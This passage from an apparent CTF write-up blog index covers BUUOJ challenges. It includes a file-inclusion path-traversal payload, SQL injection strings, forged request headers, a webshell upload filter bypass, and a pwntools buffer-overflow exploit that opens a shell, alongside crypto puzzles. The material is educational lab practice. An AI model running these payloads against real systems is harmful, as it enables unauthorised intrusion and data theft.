mb_strpos($_page . '?', '?')\n            );\n            //第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n```\n于是构建payload：/index.php?file=hint.php?../../../../../ffffllllaaaagggg\n最终访问地址是：\n```url\nhttp://03b2cc85-7af4-439b-a06e-41da80ff6505.node3.buuoj.cn/index.php?file=hint.php?../../../../../ffffllllaaaagggg\n```\nflag:~~flag{ea84fa07-6efe-4b7b-aec3-ff4b0eb1780d}~~\n\n\n","categories":["Web","PHP代码审计"]},{"title":"HCTF 2018-admin","url":"/2021/08/30/HCTF 2018-admin/","content":"[题目链接](https://buuoj.cn/challenges#[HCTF%202018]admin)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://40532241-a733-4c7a-a380-5d87849c42a9.node4.buuoj.cn\n```\n啥都不说了建议看看这篇：[HCTF2018-admin](https://blog.csdn.net/weixin_44677409/article/details/100733581)\n*这题我要去好好学习了*\n","categories":["Web","PHP代码审计"]},{"title":"SUCTF 2019-EasySQL","url":"/2021/08/30/SUCTF 2019-EasySQL/","content":"[题目链接](https://buuoj.cn/challenges#[SUCTF%202019]EasySQL)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://aea8fc94-47fa-4f23-8da2-e366fc025d28.node4.buuoj.cn:81/\n```\n打开链接：\n![](/images/Writeup/20210830085257.png)\n试了一下常规的注入：\n```\n1'\n```\norder查询\n```\n1 order by 2#\n```\n报错注入\n```\n1 and length(database())>=1#\n```\n```\n1' and length(database())>=1#\n```\n时间盲注：\n```\n1 and if(length(database())>=1,1,sleep(5))#\n```\n以上都失效了，怀疑是存在关键词排除。。堆叠注入倒是成功了：\n```sql\n1;show databases#\n```\n```text\nArray ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )\n```\n```sql\n1;show tables#\n```\n```text\nArray ( [0] => 1 ) Array ( [0] => Flag )\n```\n>这道题目需要我们去对后端语句进行猜测\n>1、输入非零数字得到的回显1和输入其余字符得不到回显=>来判断出内部的查询语句可能存在有||\n>2、也就是select 输入的数据||内置的一个列名 from 表名=>即为\n>```sql\n>select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)\n>```\n此时的||起到的作用是or的作用\n解法1\n内置的sql语句为\n>```sql\n>sql=“select”.post[‘query’].\"||flag from Flag\";\n>```\n>```text\n>1\n>```\n>如果$post[‘query’]的数据为*,1，sql语句就变成了\n>```sql\n>select *,1||flag from Flag\n>```\n>```text\n>    1\n>    ```\n>也就是\n>```sql\n>select *,1 from Flag\n>```\n>```text\n>        1\n> ```\n>也就是直接查询出了Flag表中的所有内容\n>————————————————\n>版权声明：本文为CSDN博主「一只小白来了」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n>原文链接：https://blog.csdn.net/weixin_44866139/article/details/105857487\n\n也就是构建payload：*，1\n![](/images/Writeup/20210830091034.png)\nflag:~~flag{83b62b69-02c1-4776-8996-7d431a7f3ce6}~~~\n","categories":["Web","SQL注入"]},{"title":"极客大挑战 2019-Http","url":"/2021/08/30/极客大挑战 2019-Http/","content":"[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://node4.buuoj.cn:26766/\n```\n看了一下页面信息，没发现有啥特别的地方，于是考虑抓包看看：\n![](/images/Writeup/20210830155545.png)\n![](/images/Writeup/20210830155555.png)\n发现确实存在flag的痕迹，追踪看看：\n![](/images/Writeup/20210830155730.png)\n![](/images/Writeup/20210830155803.png)\n那么就考虑构造Header发送：\n![](/images/Writeup/20210830160106.png)\n那么再伪造一下Agent：\n![](/images/Writeup/20210830160149.png)\n再伪造一下地址：\n![](/images/Writeup/20210830160238.png)\n最终的Header：\n```http\nGET /Secret.php HTTP/1.1\nHost: node4.buuoj.cn:26766\nUpgrade-Insecure-Requests: 1\nReferer:https://www.Sycsecret.com\nUser-Agent: Syclover\t\nX-Forwarded-For:127.0.0.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: UM_distinctid=17b942485b097e-0ebbcd4688e4a5-c343365-144000-17b942485b15b8\nConnection: close\n```\nflag:~~flag{1c8ea787-5f5a-4c6d-a093-947492c601b7}~~\n\n","categories":["Web","请求伪造"]},{"title":"ACTF2020 新生赛-Upload","url":"/2021/08/27/ACTF2020 新生赛-Upload/","content":"[题目链接](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Upload)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://79f86a20-8009-4135-a557-870901c134d6.node4.buuoj.cn:81\n```\n打开链接，发现是上传：\n![](/images/Writeup/20210827154822.png)\n用[[一句话)以php格式上传一下试试：\n![](/images/Writeup/20210827154947.png)\n看来是行不通，看看源码，发现有一个本地文件后缀过滤：\n![](/images/Writeup/20210827155039.png)\n删掉过滤的代码，再试图上传：\n![](/images/Writeup/20210827155130.png)\n看来还存在云端的后缀检测，用phtml试试看：\n![](/images/Writeup/20210827155352.png)\n看来是成功了，访问一下试试：\n![](/images/Writeup/20210827155422.png)\n就成功得到了flag。\nflag:~~flag{a34db48e-3826-434a-8817-8f275c246066}~~\n当然，传了马，也要试试连接一下：\n![](/images/Writeup/20210827155632.png)\n得到index.php的源码：\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"UTF-8\">\n\n  <title>你有解题思路了嘛？</title>\n\n    <link rel=\"stylesheet\" href=\"css/style.css\" media=\"screen\" type=\"text/css\" />\n\n    <script type=\"text/javascript\" src=\"./js/main.js\"></script>\n\n</head>\n<body>\n<div class=\"sitemakers\">\n<div class=\"wrap\"><svg class=\"bulb\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" width=\"128px\"\n\t height=\"128px\" viewBox=\"0 0 128 128\" enable-background=\"new 0 0 128 128\" xml:space=\"preserve\">\n<g id=\"s-bulb\">\n\t<g>\n\t\t<path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M104.145,42.922c-0.258-9.541-3.436-19.458-10.576-27.913\n\t\t\tC88.695,9.245,82.706,5.05,75.47,2.746c-3.798-1.209-7.682-1.965-11.683-1.916c-3.553,0.043-7.022,0.693-10.406,1.747\n\t\t\tc-9.279,2.88-16.414,8.597-21.776,16.625C28.182,24.328,26.107,29.98,24.958,36c-0.742,3.904-1.014,7.844-0.657,11.804\n\t\t\tc0.858,9.513,4,18.144,10.17,25.542c2.009,2.413,4.117,4.748,5.545,7.566c1.062,2.094,1.989,4.256,2.942,6.4\n\t\t\tc1.076,2.427,2.774,4.205,5.371,4.859c1.925,0.485,3.702,1.281,5.499,2.063c2.902,1.265,5.809,2.526,8.709,3.795\n\t\t\tc2.195,0.955,4.388,1.918,6.581,2.884c2.589,1.138,5.17,2.287,7.762,3.413c1.31,0.57,2.841,0.235,3.577-0.708\n\t\t\tc1.095-1.397,0.673-3.48-1.087-4.271c-1.669-0.753-3.345-1.488-5.019-2.222c-2.038-0.891-4.08-1.776-6.12-2.666\n\t\t\tc-2.604-1.136-5.216-2.268-7.821-3.411c-2.003-0.878-4-1.771-6.005-2.644c-1.102-0.479-2.207-0.95-3.326-1.39\n\t\t\tc-0.417-0.161-0.891-0.179-1.308-0.344c-0.764-0.298-1.278-0.869-1.553-1.646c-1.768-4.971-4.392-9.464-7.759-13.508\n\t\t\tc-1.509-1.809-3.09-3.554-4.336-5.57c-3.335-5.383-5.46-11.171-6.052-17.516c-0.915-9.789,1.291-18.79,6.863-26.889\n\t\t\tc4.957-7.208,11.708-12.015,20.204-14.157c6.392-1.611,12.689-1.011,18.773,1.573c9.279,3.942,15.587,10.785,19.488,19.984\n\t\t\tc2.296,5.405,3.22,11.05,3.011,16.889c-0.317,8.925-3.272,16.896-8.946,23.792c-2.068,2.513-4.124,5.015-5.803,7.807\n\t\t\tc-1.402,2.332-2.552,4.787-3.472,7.349c-0.474,1.314-1.366,2.028-2.757,2.188c-0.928,0.106-1.761,0.435-2.275,1.309\n\t\t\tc-0.89,1.508-0.273,3.811,1.588,4.196c1.883,0.39,3.575-0.188,5.144-1.113c1.738-1.026,2.893-2.557,3.605-4.471\n\t\t\tc1.734-4.653,4.226-8.836,7.528-12.581c4.964-5.618,8.227-12.141,9.869-19.48C103.665,51.369,104.143,47.883,104.145,42.922z\"/>\n\t\t<path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M77.257,116.188c0.884,0.346,1.702,0.202,2.46-0.188\n\t\t\tc0.947-0.494,1.366-1.401,1.348-2.405c-0.02-1.136-0.615-2.013-1.687-2.491c-1.944-0.869-3.899-1.721-5.848-2.575\n\t\t\tc-1.709-0.747-3.419-1.491-5.13-2.234c-2.676-1.171-5.354-2.338-8.028-3.509c-2.347-1.031-4.684-2.087-7.038-3.102\n\t\t\tc-0.792-0.343-1.614-0.626-2.435-0.891c-0.897-0.287-2.432,0.154-2.961,1.172c-0.715,1.37-0.362,3.355,1.264,4.016\n\t\t\tc2.498,1.021,4.943,2.155,7.415,3.23c2.935,1.281,5.875,2.56,8.81,3.84c2.003,0.878,3.997,1.774,6.002,2.646\n\t\t\tc0.324,0.139,0.452,0.309,0.4,0.68c-0.46,3.388-2.759,5.917-6.027,6.749c-3.471,0.886-7.294-1.126-8.787-4.443\n\t\t\tc-0.481-1.063-0.592-2.182-0.792-3.296c-0.254-1.407-1.227-2.001-2.529-2.222c-0.908-0.151-2.159,0.46-2.663,1.422\n\t\t\tc-0.438,0.83-0.415,1.74-0.272,2.663c0.696,4.489,2.935,7.963,6.953,10.109c3.115,1.666,6.446,2.109,9.915,1.108\n\t\t\tc5.003-1.449,8.154-4.682,9.476-9.707C77.146,116.592,77.19,116.428,77.257,116.188z\"/>\n\t</g>\n</g>\n<g id=\"www-filament\">\n\t<path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M82.985,29.716c0.897-0.62,1.849-0.822,2.957-0.547\n\t\tc1.471,0.363,2.109,1.95,1.953,3.176c-0.134,1.05-0.666,1.823-1.564,2.383c-0.25,0.155-0.498,0.438-0.585,0.712\n\t\tc-0.553,1.734-1.059,3.483-1.584,5.222c-1.027,3.403-2.059,6.806-3.089,10.205c-0.604,1.997-1.211,3.989-1.814,5.985\n\t\tc-1.007,3.331-2.012,6.67-3.021,10.001c-0.741,2.449-1.484,4.895-2.227,7.345c-1.016,3.353-2.025,6.708-3.051,10.062\n\t\tc-0.217,0.716-0.948,1.105-1.604,0.909c-0.719-0.215-1.057-0.821-0.822-1.608c1.04-3.506,2.104-7.005,3.151-10.508\n\t\tc0.364-1.205,0.724-2.423,1.126-3.771c-0.78,0.522-1.44,0.955-2.093,1.4c-0.971,0.659-2.496,0.685-3.463-0.059\n\t\tc-1.034-0.789-2.072-1.576-3.105-2.36c-1.011,0.771-2.009,1.495-2.968,2.274c-1.044,0.847-2.709,0.815-3.751,0.048\n\t\tc-0.78-0.574-1.604-1.091-2.516-1.7c0.321,1.07,0.595,2.012,0.879,2.952c1.155,3.807,2.311,7.614,3.46,11.425\n\t\tc0.084,0.283,0.161,0.6,0.131,0.887c-0.055,0.601-0.562,1.034-1.146,1.081c-0.543,0.045-1.157-0.374-1.344-0.949\n\t\tc-0.223-0.688-0.418-1.38-0.628-2.069c-1.357-4.498-2.712-8.995-4.074-13.494c-2.142-7.073-4.292-14.143-6.432-21.218\n\t\tc-0.945-3.118-1.818-6.26-2.834-9.356c-0.494-1.505-0.604-3.163-1.934-4.375c-0.766-0.701-0.747-1.802-0.425-2.832\n\t\tc0.275-0.885,0.818-1.444,1.703-1.732c1.167-0.381,2.189-0.102,3.155,0.579c0.963,0.675,1.942,1.331,2.909,2.001\n\t\tc1.774,1.23,3.548,2.467,5.34,3.713c0.854-0.667,1.69-1.326,2.526-1.98c2.092-1.639,4.174-3.288,6.276-4.914\n\t\tc0.789-0.609,2.453-0.664,3.224-0.089c1.265,0.942,2.491,1.93,3.729,2.9c1.731,1.358,3.462,2.715,5.197,4.082\n\t\tC77.429,33.558,80.204,31.632,82.985,29.716z M76.578,46.931c0.969-0.69,1.972-1.112,3.223-0.72\n\t\tc0.871-2.883,1.733-5.738,2.598-8.592c-0.037-0.027-0.071-0.052-0.107-0.082c-0.538,0.37-1.078,0.729-1.615,1.101\n\t\tc-1.452,1.002-2.898,2.017-4.356,3.011c-1.11,0.759-2.634,0.747-3.716-0.083c-1.969-1.515-3.91-3.071-5.864-4.604\n\t\tc-0.852-0.669-1.703-1.334-2.583-2.02c-1.043,0.813-2.09,1.621-3.129,2.439c-1.82,1.425-3.612,2.896-5.469,4.276\n\t\tc-0.99,0.738-2.432,0.763-3.523,0.02c-1.913-1.306-3.813-2.632-5.719-3.947c-0.295-0.206-0.593-0.406-1.044-0.714\n\t\tc0.96,3.179,1.871,6.201,2.794,9.26c0.205-0.032,0.395-0.032,0.566-0.086c1.027-0.336,1.94-0.049,2.781,0.529\n\t\tc1.647,1.127,3.29,2.26,4.912,3.415c0.35,0.255,0.56,0.217,0.875-0.037c1.671-1.344,3.368-2.654,5.042-3.993\n\t\tc1.141-0.916,2.937-0.785,4.069,0.181c1.643,1.404,3.388,2.689,5.091,4.024c0.042,0.033,0.102,0.047,0.187,0.083\n\t\tC73.242,49.245,74.926,48.105,76.578,46.931z M58.842,56.22c-1.109,0.887-2.681,0.887-3.8,0.103\n\t\tc-1.462-1.027-2.936-2.034-4.404-3.048c-0.141-0.099-0.283-0.189-0.567-0.375c0.981,3.251,1.921,6.36,2.869,9.502\n\t\tc0.791-0.181,1.538-0.45,2.304-0.103c0.256,0.118,0.54,0.186,0.773,0.334c0.95,0.628,1.891,1.271,2.826,1.924\n\t\tc0.253,0.175,0.43,0.189,0.693-0.025c0.866-0.709,1.776-1.363,2.642-2.074c1.126-0.928,2.846-0.918,3.977,0.019\n\t\tc0.864,0.716,1.772,1.371,2.641,2.077c0.246,0.201,0.415,0.177,0.647,0.017c0.734-0.512,1.478-1,2.207-1.517\n\t\tc0.595-0.423,1.191-0.828,1.945-0.873c0.422-0.024,0.845-0.004,1.382-0.004c0.854-2.827,1.741-5.768,2.629-8.712\n\t\tc-0.035-0.022-0.074-0.045-0.11-0.066c-1.198,0.829-2.402,1.652-3.601,2.488c-0.624,0.432-1.232,0.851-2.021,0.982\n\t\tc-0.781,0.128-1.497-0.009-2.094-0.452c-1.885-1.412-3.73-2.875-5.633-4.353C62.366,53.453,60.59,54.814,58.842,56.22z\n\t\t M49.028,49.956c2.344,1.648,4.709,3.274,7.077,4.887c0.628,0.428,1.043,0.387,1.659-0.094c1.708-1.326,3.414-2.657,5.121-3.987\n\t\tc0.839-0.653,1.699-0.653,2.537,0c1.704,1.331,3.409,2.661,5.121,3.987c0.615,0.481,1.028,0.522,1.658,0.094\n\t\tc2.369-1.613,4.725-3.247,7.086-4.874c0.473-0.325,0.651-0.772,0.525-1.338c-0.091-0.433-0.369-0.79-0.793-0.757\n\t\tc-0.429,0.026-0.88,0.21-1.245,0.443c-0.899,0.564-1.756,1.198-2.628,1.804c-0.794,0.555-1.589,1.109-2.388,1.659\n\t\tc-0.772,0.534-1.678,0.551-2.419-0.02c-1.791-1.381-3.56-2.781-5.33-4.185c-0.543-0.429-1.167-0.429-1.71,0\n\t\tc-1.771,1.404-3.541,2.804-5.328,4.181c-0.742,0.575-1.648,0.562-2.425,0.024c-1.653-1.146-3.304-2.295-4.958-3.439\n\t\tc-0.204-0.143-0.413-0.278-0.636-0.376c-0.814-0.355-1.507,0.114-1.61,1.089C48.567,49.361,48.733,49.747,49.028,49.956z\n\t\t M69.706,69.17c1.593-1.068,3.174-2.148,4.762-3.23c0.433-0.293,0.533-0.718,0.451-1.198c-0.075-0.439-0.348-0.77-0.781-0.783\n\t\tc-0.331-0.012-0.712,0.114-0.997,0.293c-0.946,0.599-1.859,1.252-2.787,1.878c-0.884,0.597-1.77,0.554-2.615-0.106\n\t\tc-0.926-0.729-1.854-1.457-2.781-2.18c-0.52-0.405-1.094-0.403-1.619,0.008c-0.927,0.722-1.851,1.449-2.779,2.176\n\t\tc-0.841,0.661-1.728,0.694-2.615,0.096c-0.913-0.617-1.818-1.245-2.732-1.857c-0.725-0.484-1.3-0.452-1.658,0.066\n\t\tc-0.386,0.562-0.22,1.265,0.432,1.712c1.502,1.037,3.008,2.06,4.521,3.081c0.596,0.396,1.035,0.381,1.624-0.062\n\t\tc0.955-0.717,1.889-1.463,2.849-2.173c0.768-0.572,1.585-0.569,2.355,0.003c0.96,0.716,1.895,1.462,2.854,2.174\n\t\tc0.232,0.173,0.526,0.271,0.787,0.399C69.262,69.355,69.511,69.304,69.706,69.17z\"/>\n</g> \n</svg>\n      <div class=\"light\"><span class=\"glow\">\n\t\t\t<form enctype=\"multipart/form-data\" method=\"post\" onsubmit=\"return checkFile()\">\n\t\t\t\t嘿伙计，你发现它了！\n                <input class=\"input_file\" type=\"file\" name=\"upload_file\"/>\n                <input class=\"button\" type=\"submit\" name=\"submit\" value=\"upload\"/>\n            </form>\n      </span><span class=\"flare\"></span><div>\n</div>\n</div>\n<?php\n\terror_reporting(0);\n\t//设置上传目录\n\tdefine(\"UPLOAD_PATH\", \"./uplo4d\");\n\t$msg = \"Upload Success!\";\n\tif (isset($_POST['submit'])) {\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $file_name = $_FILES['upload_file']['name'];\n        $ext = pathinfo($file_name,PATHINFO_EXTENSION);\n        if(in_array($ext, ['php', 'php3', 'php4', 'php5'])) {\n\t        exit('nonono~ Bad file！');\n    \t}\n\n        $new_file_name = md5($file_name).\".\".$ext;\n        $img_path = UPLOAD_PATH . '/' . $new_file_name;\n\n\n        if (move_uploaded_file($temp_file, $img_path)){\n            $is_upload = true;\n        } else {\n            $msg = 'Upload Failed!';\n        }\n        echo '<div style=\"color:#F00\">'.$msg.\" Look here~ \".$img_path.\"</div>\";\n    }\n\n\n?>\n</body>\n</html>\n```\n看来后台过滤了'php', 'php3', 'php4', 'php5'这几个后缀，也就是还剩'php7','phtml','phps','pht'这几个格式还能用。\n\n---\n参考：[# [BUUOJ记录] [ACTF2020 新生赛]Upload _](https://www.cnblogs.com/yesec/p/12403922.html)\n\n","categories":["Web","PHP代码审计","文件上传"]},{"title":"Alice与Bob","url":"/2021/08/26/Alice与Bob/","content":"[题目链接](https://buuoj.cn/challenges#Alice%E4%B8%8EBob)\n<!-- more -->\n网上找的代码（我实在不会）：\n```python\nfrom random import randint\nfrom fractions import gcd\nfrom math import *\n\ndef PollardRho(n):\n    i=0;\n    b=randint(0,n-1);\n    k=2\n    y=b\n    while i< n:\n        i=i+1\n        b=((b^2)-1)%n\n        d=gcd(y-b,n)\n        if d!=1 and d!=n:\n            print(d)\n        if i==k:\n            y=b\n            k=2*k\n```\n执行程序，得到flag。\nflag:~~flag(98554799767)~~\n\n","categories":["Crypto","Base"]},{"title":"AFCTF2018-Morse","url":"/2021/08/26/AFCTF2018-Morse/","content":"\n[题目链接]()\n<!-- more -->\n附件下载，得到密文：\n\n```text\n-..../.----/-..../-..../-..../...--/--.../....-/-..../-..../--.../-.../...--/.----/--.../...--/..---/--.../--.../....-/...../..-./--.../...--/...--/-----/...../..-./...--/...--/...--/....-/...--/...../--.../----./--.../-..\n```\n用脚本以\"/\"为隔断，切割出摩斯电码：\n```python\ns1=\"-..../.----/-..../-..../-..../...--/--.../....-/-..../-..../--.../-.../...--/.----/--.../...--/..---/--.../--.../....-/...../..-./--.../...--/...--/-----/...../..-./...--/...--/...--/....-/...--/...../--.../----./--.../-..\"\nprint(s1.replace(\"/\",\" \"))\n```\n运行脚本，就得到了：\n```text\n61666374667b317327745f73305f333435797d\n```\n将其包上flag提交，却提示flag错误，就怀疑是不是还有下一步操作，看看ASCII表，发现这其实是ASCII编码，将其分组解码：\n```python\ns1=\"61666374667b317327745f73305f333435797d\"\ni:int=0\ns2=[]\ns3:str=\"\"\nwhile i<len(s1):\n    s3+=s1[i]\n    if i%2:\n        s2.append(s3)\n        s3=\"\"\n    i+=1\ns=\"\"\nfor letter in s2:\n    s+=chr(int(letter,16))\nprint (s)\n```\n运行程序，得到了最终的flag。\nflag:~~afctf{1s't_s0_345y}~~\n*记得改提交格式*\n\n\n\n","categories":["Crypto","摩斯密码","ASCII"]},{"title":"Quoted-printable","url":"/2021/08/26/Quoted-printable/","content":"[题目链接](https://buuoj.cn/challenges#Quoted-printable)\n<!-- more -->\n密文：\n```\n=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6\n```\n在线转换一下[在线工具](http://www.mxcz.net/tools/quotedprintable.aspx)\nflag:~~flag{那你也很棒哦}~~\n","categories":["Crypto","MIME"]},{"title":"Unencode","url":"/2021/08/26/Unencode/","content":"[题目链接](https://buuoj.cn/challenges#Unencode)\n<!-- more -->\n附件下载，得到密文：\n```text\n89FQA9WMD<V1A<V1S83DY.#<W3$Q,2TM]\n```\n直接[CTF在线工具](http://ctf.ssleye.com/uu.html)解码。\nflag:~~flag{dsdasdsa99877LLLKK}~~\n\n","categories":["Crypto","摩斯密码","ASCII"]},{"title":"rip","url":"/2021/08/26/rip/","content":"[题目链接](https://buuoj.cn/challenges#rip)\n<!-- more -->\n先看一下保护信息：\n![](/images/Writeup/20210914080714.png)\n```shell\nrandark@randark-VirtualBox:~/shared$ checksec pwn1\n[*] '/home/randark/shared/pwn1'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x400000)\n    RWX:      Has RWX segments\n```\nIDA打开看一下逻辑：\n![](/images/Writeup/20210914080827.png)\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char s[15]; // [rsp+1h] [rbp-Fh] BYREF\n\n  puts(\"please input\");\n  gets(s, argv);\n  puts(s);\n  puts(\"ok,bye!!!\");\n  return 0;\n}\n```\n可以看到关键点应该是变量s，再找一下后门函数：\n```c\nint fun() //0x401186\n{\n  return system(\"/bin/sh\");\n}\n```\n依此构造playload，并且记得堆栈平衡（Ubuntu 18）：\n![](/images/Writeup/20210914081347.png)\n```python\nfrom pwn import *\n\n  \n\np = remote('node4.buuoj.cn', 26498)\n\n  \n\nbackdoor = 0x401186\n\nretn = 0x401198\n\n  \n\npayload = 'a'.encode()*(0xF+8) + p64(retn) + p64(backdoor)\n\np.sendline(payload)\n\np.interactive()\n```\n得到返回：\n```shell\nrandark@randark-VirtualBox:~/shared$ python Pwn.py\n[+] Opening connection to node4.buuoj.cn on port 26498: Done\n[*] Switching to interactive mode\n$ ls\nbin\nboot\ndev\netc\nflag\nhome\nlib\nlib32\nlib64\nmedia\nmnt\nopt\nproc\npwn\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n$ cat flag\nflag{fb8eabb8-482d-407c-aed5-039f1d20cda7}\n$ \n[*] Interrupted\n[*] Closed connection to node4.buuoj.cn port 26498\n```\nflag:~~flag{fb8eabb8-482d-407c-aed5-039f1d20cda7}~~\n\n---\n#pwn \n2021-09-14\n","categories":["Crypto","摩斯密码","ASCII"]},{"title":"丢失的MD5","url":"/2021/08/26/丢失的MD5/","content":"[题目链接](https://buuoj.cn/challenges#%E4%B8%A2%E5%A4%B1%E7%9A%84MD5)\n<!-- more -->\n附件下载，得到程序代码：\n```python\nimport hashlib   \nfor i in range(32,127):\n    for j in range(32,127):\n        for k in range(32,127):\n            m=hashlib.md5()\n            m.update('TASC'+chr(i)+'O3RJMV'+chr(j)+'WDJKX'+chr(k)+'ZM')\n            des=m.hexdigest()\n            if 'e9032' in des and 'da' in des and '911513' in des:\n                print des\n```\nVScode打开来直接红波浪线了，看起来像是语法错误，改一下语法，加一下编码设置：\n```python\nimport hashlib   \nfor i in range(32,127):\n    for j in range(32,127):\n        for k in range(32,127):\n            m=hashlib.md5()\n            m.update(bytes(('TASC'+chr(i)+'O3RJMV'+chr(j)+'WDJKX'+chr(k)+'ZM').encode(\"utf-8\")))\n            des=m.hexdigest()\n            if 'e9032' in des and 'da' in des and '911513' in des:\n                print (des)\n```\n运行程序便得到了flag的数据。\nflag:~~flag{e9032994dabac08080091151380478a2}~~\n","categories":["Crypto"]},{"title":"世上无难事","url":"/2021/08/26/世上无难事/","content":"[题目链接](https://buuoj.cn/challenges#%E4%B8%96%E4%B8%8A%E6%97%A0%E9%9A%BE%E4%BA%8B)\n<!-- more -->\n附件下载，得到密文：\n```text\nVIZZB IFIUOJBWO NVXAP OBC XZZ UKHVN IFIUOJBWO HB XVIXW XAW VXFI X QIXN VBD KQ IFIUOJBWO WBKAH NBWXO VBD XJBCN NKG QLKEIU DI XUI VIUI DKNV QNCWIANQ XN DXPIMKIZW VKHV QEVBBZ KA XUZKAHNBA FKUHKAKX XAW DI VXFI HBN QNCWIANQ NCAKAH KA MUBG XZZ XEUBQQ XGIUKEX MUBG PKAWIUHXUNIA NVUBCHV 12NV HUXWI XAW DI XUI SCQN QB HZXW NVXN XZZ EBCZW SBKA CQ NBWXO XAW DI DXAN NB NVXAP DXPIMKIZW MBU JIKAH QCEV XA BCNQNXAWKAH VBQN HKFI OBCUQIZFIQ X JKH UBCAW BM XLLZXCQI XAW NVI PIO KQ 640I11012805M211J0XJ24MM02X1IW09\n```\n看题目的意思，应该跟[[凯撒？替换？呵呵!]]这道题的逻辑差不多，主要是词频分析，用[quipquip](https://quipqiup.com/)分析一下：\n```text\nHELLO EVERYBODY THANK YOU ALL RIGHT EVERYBODY GO AHEAD AND HAVE A SEAT HOW IS EVERYBODY DOING TODAY HOW ABOUT TIM SPICER WE ARE HERE WITH STUDENTS AT WAKEFIELD HIGH SCHOOL IN ARLINGTON VIRGINIA AND WE HAVE GOT STUDENTS TUNING IN FROM ALL ACROSS AMERICA FROM KINDERGARTEN THROUGH 12TH GRADE AND WE ARE JUST SO GLAD THAT ALL COULD JOIN US TODAY AND WE WANT TO THANK WAKEFIELD FOR BEING SUCH AN OUTSTANDING HOST GIVE YOURSELVES A BIG ROUND OF APPLAUSE AND THE KEY IS 640E11012805F211B0AB24FF02A1ED09\n```\n*这种题目就是比拼谁的网站好用XD*\nflag:~~flag{640e11012805f211b0ab24ff02a1ed09}~~\n\n","categories":["Crypto","凯撒密码","词频分析"]},{"title":"传统知识+古典密码","url":"/2021/08/26/传统知识+古典密码/","content":"[题目链接](https://buuoj.cn/challenges#%E4%BC%A0%E7%BB%9F%E7%9F%A5%E8%AF%86+%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81)\n<!-- more -->\n附件下载，得到题目：\n```text\n小明某一天收到一封密信，信中写了几个不同的年份\n          辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。\n          信的背面还写有“+甲子”，请解出这段密文。\n\nkey值：CTF{XXX}\n```\n通过对照表知道数据：\n![](/images/Writeup/20180718185218133.jpg)\n```text\n88 90 83 68 77 70 76 90\n```\n转换为ASCII得到：\n```text\nXZSDMFLZ\n```\n题目里面又提到涉及古典加密，看一下，不大像栅栏加密，试试凯撒加密，就得到了flag：\nflag:~~flag{SHUANGYU}~~\n附件里面还有一个压缩包，解压看看：\n```text\n5555555595555A65556AA696AA6666666955\n这是某压力传感器无线数据包解调后但未解码的报文(hex)\n  \n已知其ID为0xFED31F，请继续将报文完整解码，提交hex。\n\n提示1：曼联\n```\n\n","categories":["Crypto","凯撒密码"]},{"title":"信息化时代的步伐","url":"/2021/08/26/信息化时代的步伐/","content":"[题目链接](https://buuoj.cn/challenges#%E4%BF%A1%E6%81%AF%E5%8C%96%E6%97%B6%E4%BB%A3%E7%9A%84%E6%AD%A5%E4%BC%90)\n<!-- more -->\n附件下载，得到密文：\n```text\n606046152623600817831216121621196386\n```\n在线解码中文电码[在线工具](http://code.mcdvisa.com/)，得到flag。\nflag:~~flag{计算机要从娃娃抓起}~~\n\n","categories":["Crypto"]},{"title":"凯撒？替换？呵呵!","url":"/2021/08/26/凯撒？替换？呵呵!/","content":"[题目链接](https://buuoj.cn/challenges#%E5%87%AF%E6%92%92%EF%BC%9F%E6%9B%BF%E6%8D%A2%EF%BC%9F%E5%91%B5%E5%91%B5!)\n<!-- more -->\n密文：\n```text\nMTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}\n```\n题目有说到存在凯撒密码，并且存在替换，就先研究前四个字符：\n```text\n密文     M  T  H  J\nASCII  77  84 72 74\n明文1    F  L  A  G\nASCII  70  76 65 71\n明文2    f  l  a  g\nASCII  102 108 97 103 \n```\n没有思路。。百度上看了，全是[quipquip](https://quipqiup.com/)在线解出来的，绝了。。\nflag:~~flag{substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake}~~\n这道题就不用纠结怎么做了，应该没有正常的做法。。\n分析程序：\n```python\ns1=\"MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}\"\ns2=\"flag{substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake}\"\nfor letter in s1:\n    print(ord(letter),end=\" \")\nprint(\"\\n\\n\")\nfor letter in s2:\n    print(ord(letter),end=\" \")\nprint(\"\\n\\n\")\ni:int=0\nwhile i<len(s1):\n    